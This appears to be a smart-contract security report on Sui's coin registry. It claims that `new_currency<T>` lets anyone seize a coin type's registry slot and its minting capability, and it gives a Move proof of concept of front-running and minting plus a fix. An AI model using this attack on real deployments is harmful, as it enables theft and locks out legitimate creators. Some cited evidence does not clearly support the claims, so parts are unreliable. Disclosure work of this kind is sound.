### Title
Unprivileged `new_currency<T>` Permanently Claims Registry Slot and Mints Unauthorized `TreasuryCap<T>` for Any Coin Type — (File: `crates/sui-framework/packages/sui-framework/sources/registries/coin_registry.move`)

---

### Summary

`coin_registry::new_currency<T>` is a `public` function that accepts any `T` with the `key` ability and no proof of type ownership. Any ordinary SUI holder can call it for a coin type they do not define, permanently claiming the `CurrencyKey<T>` slot in the global `CoinRegistry` (at `0xc`) and receiving an unauthorized `TreasuryCap<T>`. The legitimate coin creator is then permanently blocked from registering their own type.

---

### Finding Description

The `CoinRegistry` module exposes two coin-creation paths:

1. **`new_currency_with_otw<T: drop>`** — requires a One-Time Witness (OTW), which can only be consumed inside the `init` function of the module that defines `T`. This path is correctly restricted.

2. **`new_currency<T: /* internal */ key>`** — the `/* internal */` annotation is a code comment, not a Move type-system constraint. The function is declared `public` and accepts any `T` that has the `key` ability, with no witness, no `Publisher`, and no `internal::Permit<T>`. [1](#0-0) 

Inside `new_currency`, the very first write to shared state is:

```move
id: derived_object::claim(&mut registry.id, CurrencyKey<T>()),
``` [2](#0-1) 

`derived_object::claim` adds a `Claimed(id) → ClaimedStatus::Reserved` dynamic field to the registry's UID. Once set, it can never be removed (the `derived_object` module has no `unclaim` function and the comment in the tests confirms: "If the UID has been deleted through `object::delete`, this will always return true"). [3](#0-2) 

The subsequent `assert!(!registry.exists<T>(), ECurrencyAlreadyExists)` in every other registration path then permanently aborts for the legitimate creator. [4](#0-3) 

Compare with `display_registry::new<T>`, which correctly enforces type ownership via `internal::Permit<T>` — a value that can only be constructed by the module defining `T`: [5](#0-4) 

`coin_registry::new_currency` has no equivalent guard.

---

### Impact Explanation

An attacker who calls `new_currency<VICTIM_COIN>(registry, ...)` followed by `finalize(builder, ctx)`:

1. **Permanently claims** the `CurrencyKey<VICTIM_COIN>` derived-object slot in the global `CoinRegistry`. The legitimate creator's subsequent call to `new_currency<VICTIM_COIN>` aborts with `ECurrencyAlreadyExists`. This is irreversible — the slot is `Reserved` forever.

2. **Receives an unauthorized `TreasuryCap<VICTIM_COIN>`** — the sole minting authority for that coin type. The attacker can mint an unbounded supply of `VICTIM_COIN` and transfer it to any address.

3. **Receives an unauthorized `MetadataCap<VICTIM_COIN>`** — allowing the attacker to set the coin's name, symbol, description, and icon URL.

The legitimate coin creator is left with a published package whose coin type is permanently unregisterable and whose minting authority is held by an adversary.

Allowed-impact match: **Critical** — unauthorized object creation (`TreasuryCap<T>`) enabling direct fund theft (unbounded minting); and **High** — permanent harmful smart-contract behavior (coin type permanently locked out of the registry).

---

### Likelihood Explanation

- The `CoinRegistry` is a well-known shared object at address `0xc`. Its object reference is public.
- The attack requires only a standard SUI account and gas. No special capability is needed.
- The attacker only needs to know the fully-qualified type name of the victim's coin (visible on-chain the moment the package is published).
- The attack can be executed in the same checkpoint as the victim's package publication by monitoring the mempool or simply racing after observing the publish transaction.
- The `new_currency` path is the **recommended** path for coin types with `key` ability (as opposed to the OTW path), so many real coin deployments are affected.

---

### Recommendation

Require proof of type ownership in `new_currency<T>`, mirroring the pattern already used in `display_registry::new<T>`. The simplest fix is to add an `internal::Permit<T>` parameter:

```move
public fun new_currency<T: key>(
    registry: &mut CoinRegistry,
    _permit: internal::Permit<T>,   // <-- add this
    decimals: u8,
    symbol: String,
    name: String,
    description: String,
    icon_url: String,
    ctx: &mut TxContext,
): (CurrencyInitializer<T>, TreasuryCap<T>)
```

`internal::Permit<T>` can only be constructed by the module that defines `T`, enforcing type ownership at the Move type-system level without requiring an OTW. [6](#0-5) 

Alternatively, accept a `Publisher` object and assert `publisher.from_package<T>()`, as `display_registry::new_with_publisher` does. [7](#0-6) 

---

### Proof of Concept

Assume Alice publishes a package containing:

```move
module alice::my_coin;
public struct MY_COIN has key { id: sui::object::UID }
```

**Step 1 — Attacker front-runs registration:**

```move
// Bob's transaction, submitted immediately after Alice's publish tx lands
let (init, treasury_cap) = coin_registry::new_currency<alice::my_coin::MY_COIN>(
    registry,          // shared CoinRegistry at 0xc
    6,
    b"ALICE".to_string(),
    b"Alice Coin".to_string(),
    b"".to_string(),
    b"".to_string(),
    ctx,
);
let metadata_cap = init.finalize(ctx);
// Bob now holds TreasuryCap<MY_COIN> and MetadataCap<MY_COIN>
```

**Step 2 — Alice's legitimate registration fails:**

```move
// Alice's transaction aborts with ECurrencyAlreadyExists
let (_init, _cap) = coin_registry::new_currency<alice::my_coin::MY_COIN>(
    registry, 6, ..., ctx,
); // ABORT: ECurrencyAlreadyExists
```

**Step 3 — Bob mints Alice's coins:**

```move
// Bob mints 1_000_000_000_000 MY_COIN to himself
let coin = treasury_cap.mint(1_000_000_000_000, ctx);
transfer::public_transfer(coin, bob_address);
```

The `CurrencyKey<MY_COIN>` slot in the `CoinRegistry` is permanently `Reserved`. Alice's coin type is irrecoverably blocked from the registry, and Bob holds unbounded minting authority over it. [8](#0-7) [9](#0-8)

public fun new_currency<T: /* internal */ key>(
    registry: &mut CoinRegistry,
    decimals: u8,
    symbol: String,
    name: String,
    description: String,
    icon_url: String,
    ctx: &mut TxContext,
): (CurrencyInitializer<T>, TreasuryCap<T>) {
    assert!(!registry.exists<T>(), ECurrencyAlreadyExists);
    assert!(is_ascii_printable!(&symbol), EInvalidSymbol);

    let treasury_cap = coin::new_treasury_cap(ctx);
    let currency = Currency<T> {
        id: derived_object::claim(&mut registry.id, CurrencyKey<T>()),
        decimals,
        name,
        symbol,
        description,
        icon_url,
        supply: option::some(SupplyState::Unknown),
        regulated: RegulatedState::Unregulated,
        treasury_cap_id: option::some(object::id(&treasury_cap)),
        metadata_cap_id: MetadataCapState::Unclaimed,
        extra_fields: vec_map::empty(),
    };

    (CurrencyInitializer { currency, is_otw: false, extra_fields: bag::new(ctx) }, treasury_cap)
